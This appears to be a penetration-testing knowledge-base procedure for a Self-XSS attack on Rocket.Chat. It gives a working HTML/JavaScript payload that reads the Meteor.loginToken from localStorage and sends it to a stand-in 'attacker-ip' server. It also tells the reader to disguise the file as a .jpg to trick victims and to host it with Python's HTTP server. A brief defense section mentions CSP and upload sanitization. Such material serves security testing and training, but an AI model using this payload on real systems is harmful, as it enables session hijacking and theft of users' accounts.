---
tags:
  - xss
  - payload-creation
type: procedure
tools:
  - '[[tools/Python-HTTP-Server]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/python-http-server-start]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:32.173Z'
sub_techniques: []
id: fcd55079-b782-4c21-902b-7e8ce2d6b3d5
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Prepare-and-Serve-Malicious-Payload-for-Self-XSS

## Summary

This procedure involves creating an HTML file with embedded JavaScript that exfiltrates the Meteor.loginToken from localStorage and disguising it as an image for drag-and-drop into Rocket.Chat, then hosting it via a simple HTTP server to enable Self-XSS exploitation.

## Description

In the context of Rocket.Chat's drag-and-drop image upload vulnerability, the attacker crafts a malicious HTML payload that appears as a harmless image file. When dropped into the chat interface, the lack of proper sanitization allows the JavaScript to execute in the victim's browser, capturing the session token and sending it to the attacker's controlled server. This sets up the foundation for session hijacking. Prerequisites include Python installed for the HTTP server and basic knowledge of JavaScript for payload creation.

## Requirements

1. Python 3.x installed on the attacker's machine
2. Access to create and edit HTML/JS files
3. Network connectivity to host the server and receive callbacks from the victim

## Defense

Defensive measures and detection strategies:

- Implement strict content-type validation and sanitization for drag-and-drop uploads in web apps
- Use Content Security Policy (CSP) to restrict script execution from untrusted sources
- Monitor for anomalous HTTP requests to internal or external servers from chat interfaces

## Objectives

1. Host a malicious payload accessible to the victim
2. Ensure payload executes JavaScript to steal session data
3. Prepare for token retrieval in subsequent steps

## Instructions

### Step 1: Create the Malicious Payload

**Context**: Develop an HTML file that logs the session token to the attacker's server upon execution.

No command required; manually create `fake-image.html` with content like:

```html
<!DOCTYPE html>
<html>
<body>
<script>
  var token = localStorage.getItem('Meteor.loginToken');
  fetch('http://attacker-ip:8000/steal?token=' + encodeURIComponent(token));
</script>
</body>
</html>
```

> This script extracts the token and sends it via GET to the attacker's endpoint. Disguise the file extension (e.g., rename to .jpg) to trick the victim.

### Step 2: Start the HTTP Server

**Context**: Host the payload file so the victim can access and download it.

**Command** ([[commands/python-http-server-start]]):
```bash
python -m http.server
```

> Starts a server on port 8000 serving files from the current directory. Expected output: "Serving HTTP on 0.0.0.0 port 8000". Access via http://localhost:8000/fake-image.html.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/python-http-server-start]]

## Tools Used

- [[tools/Python-HTTP-Server]]

## Tags

- xss
- payload-hosting
